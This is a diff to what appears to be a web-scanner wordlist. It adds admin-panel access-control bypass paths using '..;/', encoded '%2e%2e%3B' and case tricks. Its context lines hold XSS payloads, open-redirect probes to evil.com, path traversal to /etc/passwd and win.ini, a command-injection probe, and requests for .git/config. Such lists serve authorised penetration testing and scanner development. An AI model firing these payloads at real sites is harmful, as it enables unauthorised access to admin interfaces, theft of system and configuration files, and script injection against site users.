@@ -38,6 +38,8 @@
 /.wp-config.php.swp
 /////evil.com
 ///evil.com/%2F..
+//admin/
+//anything/admin/
 //evil.com/%2F..
 //evil.com/..;/css
 //secure/ConfigurePortalPages!default.jspa?view=search&searchOwnerUserName=%3Cscript%3Ealert(1)%3C/script%3E&Search=Search
@@ -100,8 +102,11 @@
 /adfs/services/trust/2005/windowstransport
 /adjuncts/3a890183/
 /admin
+/admin../admin
 /admin.html?s=admin/api.Update/get/encode/34392q302x2r1b37382p382x2r1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b2t382r1b342p37373b2s
 /admin/
+/Admin/
+/admin/../admin
 /admin//phpmyadmin/
 /admin/adminer.php
 /admin/data/autosuggest
@@ -117,6 +122,8 @@
 /admin/logs/errors.log
 /admin/queues.jsp?QueueFilter=yu1ey%22%3e%3cscript%3ealert(%221%22)%3c%2fscript%3eqb68
 /admin/views/ajax/autocomplete/user/a
+/admin;/
+/Admin;/
 /adminadminer.php
 /adminer.php
 /adminer/
@@ -336,6 +343,7 @@
 /IMS
 /index.htm
 /index.jsp
+/index.php/admin/
 /index.php?appservlang=%3Csvg%2Fonload=confirm%28%27xss%27%29%3E
 /index.php?r=students/guardians/create&id=1%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
 /index.php?redirect=//evil.com
@@ -489,6 +497,14 @@
 /rest/tinymce/1/macro/preview
 /rgs/
 /rgsclients/
+/robots.txt%2e%2e%3B/
+/robots.txt..%3B/
+/robots.txt../admin/
+/robots.txt..;/
+/robots.txt/%2e%2e%3B/
+/robots.txt/..%3B/
+/robots.txt/../admin/
+/robots.txt/..;/
 /rpc/
 /rpcwithcert/
 /run
@@ -531,8 +547,14 @@
 /sql.sql
 /sslmgr
 /stat.jsp?cmd=chcp+437+%7c+dir
+/static%2e%2e%3B/
+/static..%3B/
 /static../.git/config
+/static../admin/
+/static..;/
 /static/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini
+/static/%2e%2e%3B/
+/static/..%3B/
 /static/..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd
 /static/..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd
 /static/..%5c..%5c..%5c..%5c..%5cetc/passwd
@@ -541,6 +563,8 @@
 /static/..%5c..%5cetc/passwd
 /static/..%5cetc/passwd
 /static/../../../a/../../../../etc/passwd
+/static/../admin/
+/static/..;/
 /status%3E%3Cscript%3Ealert(31337)%3C%2Fscript%3E
 /status/selfDiscovered/status
 /store/app/etc/local.xml
